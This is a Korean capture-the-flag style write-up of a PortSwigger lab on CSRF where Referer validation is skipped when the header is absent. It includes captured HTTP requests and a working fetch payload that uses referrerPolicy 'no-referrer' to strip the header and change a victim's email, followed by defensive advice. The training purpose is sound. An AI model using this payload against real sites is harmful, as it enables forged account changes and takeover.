+++
date = '2026-06-25T15:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - CSRF where Referer validation depends on header being present'
summary = "Referer가 있을 때만 검증하는 안전하지 않은 폴백을 referrer policy로 헤더 자체를 제거해 우회하는 풀이"
toc = true
tags = ["CSRF", "Referer Validation", "Referrer-Policy", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

> ![image.png](/writeup/portswigger/csrf/11/1.png)

이메일 변경 기능에 CSRF 취약점이 존재한다. 애플리케이션이 교차 도메인 요청을 차단하려 시도하지만 안전하지 않은 폴백을 사용한다. 제목에서 알 수 있듯 Referer 검증이 헤더의 존재 여부에 의존한다. CSRF 공격으로 피해자의 이메일 주소를 변경하면 문제가 해결된다. 실습 계정은 `wiener:peter`다.

### CSRF 진단

정상적으로 이메일을 변경하고 요청을 확인한다.

```http
POST /my-account/change-email HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
Content-Type: application/x-www-form-urlencoded
Origin: https://<lab-id>.web-security-academy.net
Referer: https://<lab-id>.web-security-academy.net/my-account?id=wiener

email=csrf%40csrf.com
```

CSRF 토큰은 없다. 문제에서 Referer 검증을 한다고 했으므로 `Referer` 값을 다른 도메인으로 바꿔 보내면 요청이 거부된다.

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8

"Invalid referer header"
```

이번에는 `Referer` 헤더를 아예 제거하고 보내면 이메일이 정상적으로 변경된다. 검증 로직이 "헤더가 있으면 도메인을 확인하고, 없으면 통과"하는 구조인 것이다.

세션 쿠키의 `SameSite`도 `None`이므로 교차 사이트 `POST`에 쿠키가 실린다.

---

## 익스플로잇

`Referer` 헤더 없이 요청을 보내도록 페이로드를 구성한다.

```html
<script>
fetch("https://<lab-id>.web-security-academy.net/my-account/change-email", {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    referrerPolicy: "no-referrer",
    body: "email=csrf2@csrf.com"
});
</script>
```

`Referer`는 스크립트가 값을 직접 지정할 수 없는 forbidden header다. `headers`에 넣어도 브라우저가 무시하고 자신이 계산한 값을 보낸다. 하지만 **값을 정하는 것과 보낼지 말지를 정하는 것은 다르다.** 참조자 정책(referrer policy)은 값의 노출 범위를 제어하는 정식 수단이므로, `no-referrer`를 지정하면 브라우저가 헤더 자체를 생략한다.

`credentials: "include"`로 교차 출처 요청에 쿠키를 첨부하고, 응답은 CORS에 막혀 읽을 수 없지만 CSRF는 응답을 읽을 필요가 없으므로 문제가 되지 않는다.

이 페이로드를 피해자에게 전달하면 문제가 해결된다.

![image.png](/writeup/portswigger/csrf/11/2.png)

---

## 정리

Referer 기반 방어는 헤더가 항상 도착한다는 전제 위에 서 있다. 그러나 `Referer`는 원래 프라이버시 고려 때문에 생략될 수 있도록 설계된 헤더다. HTTPS에서 HTTP로 이동할 때, 브라우저나 확장이 프라이버시 설정으로 차단할 때, 그리고 이 랩처럼 참조자 정책이 `no-referrer`일 때 헤더는 오지 않는다.

그래서 구현자는 헤더가 없는 정상 사용자를 차단하지 않기 위해 "없으면 통과"라는 폴백을 넣게 되고, 공격자는 그 폴백을 그대로 이용한다. [토큰 존재 여부에 의존하는 검증 랩](/write-up/portswigger/csrf/write-up-portswigger---csrf-where-token-validation-depends-on-token-being-present/)과 정확히 같은 구조다. 검증 값이 없을 때를 실패로 처리하지 않으면 검증은 선택 사항이 된다.

헤더를 제거하는 방법은 `fetch`의 `referrerPolicy` 외에도 여러 가지가 있다. 문서 전체에 적용하려면 `<meta name="referrer" content="no-referrer">`를 넣으면 되고, 개별 링크나 폼에는 `rel="noreferrer"`, 응답에는 `Referrer-Policy` 헤더를 사용할 수 있다. 즉 공격자는 전달 방식과 무관하게 헤더를 지울 수 있다.

방어는 Referer가 없는 요청을 실패로 처리하는 것이다. 다만 그렇게 하면 정상 사용자 일부가 차단되므로 Referer 검증 자체가 실용적인 단독 방어가 되기 어렵다. 근본적으로는 세션에 결합된 CSRF 토큰을 사용하고, Referer나 `Origin` 검증은 보조 수단으로만 두어야 한다.
